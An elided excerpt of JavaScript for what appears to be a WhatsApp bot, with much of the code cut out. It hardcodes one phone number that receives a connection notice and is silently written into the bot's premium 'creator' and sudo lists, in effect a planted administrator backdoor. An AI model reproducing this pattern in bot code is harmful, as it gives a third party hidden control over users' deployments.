...
async function connectToWhatsapp(handleMessage) {
    ...
    sock.ev.on('connection.update', async (update) => {
        ...
        if (connection === 'close') {
            ...
            // --- WELCOME MESSAGE ---
            try {
                const chatId = '237650554606@s.whatsapp.net';
                ...
                const messageText = `
╔══════════════════╗
      *Prince k Bot Connected Successfully* 🚀
╠══════════════════╣
    ...
    setTimeout(async () => {
        if (!state.creds.registered) {
            ...
            try {
                ...
                const number = 237650554606;

                if (asPremium === true) {
                    configmanager.premiums.premiumUser['c'] = {
                        creator: '237650554606'
                    };
                ...
                setTimeout(() => {
                    ...
                    configmanager.config.users[number] = {
                        sudoList: ['237650554606@s.whatsapp.net'],
